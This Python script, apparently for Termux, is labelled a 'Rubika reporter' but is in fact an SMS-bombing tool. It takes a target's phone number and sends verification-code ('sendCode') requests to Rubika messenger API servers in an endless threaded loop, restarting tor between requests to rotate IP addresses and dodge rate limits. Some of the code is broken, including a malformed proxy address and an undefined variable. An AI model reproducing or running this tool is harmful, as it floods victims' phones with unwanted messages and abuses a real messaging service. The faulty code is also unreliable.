import os
import time
import requests
from threading import Thread
from colorama import Fore
from time import sleep
proxy = {"https": "127.0.0.1.9050"}
os.system("pkg install tor")
print(Fore.GREEN)
print("""                   Play Reporters
""")
print(Fore.RED)
print("""


(Script By mmd ryson reporter)


/////////////////////
//////////RUBIKA_REPORTS
///////////////////
/////////ON REPORT OR REPORT
||||||||||||||||||||||||||||
//////////////////
////USER CREATOR= T.ME/CREATOR_RYSON
""")
print ("")
print ("Number User reported")

def shad(phone):
    #Rubika api
    rubikaH = {"Host": "messengerg2c17.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 7; SM-A510F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir/","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "messengerg2c17.iranlms.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    shadD = {"api_version":"5","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        rubikaR = requests.post("messengerg2c17.iranlms.ir/", headers=rubikaH, json=rubikaD, proxies=proxy)
        if "OK" in rubikaR.text:
            print ("Ok Reporter :))")
        else:
            print ("REPORT")
    except:
        print ("No")


#Nemed


def rubika(phone):
    #rubika api
    ruH = {"Host": "messengerg2c4.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    ruD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD, proxies=proxy)
        if "OK" in ruR.text:
            print ("Report")
        else:
            print ("REPORTER")
    except:
        print ("  spam report")

def main():
    phone = str(input("""
~~~~~~~~~~~~~~~~~~~
|||||||||||||||||||
|||====||★||====|||
|||====||★||====|||
||Report___Rubika||
|||||||||||||||||||
|||||||||||||||||||
|||||||||||||||||||
~~~~~~~~~~~~~~~~~~~

#666
             
Number-Report (+98xxx) >> """))
    while True:
        Thread(target=rubika, args=[phone]).start()
        os.system("killall -HUP tor")
        time.sleep(3)


if __name__ == "__main__":
    main()

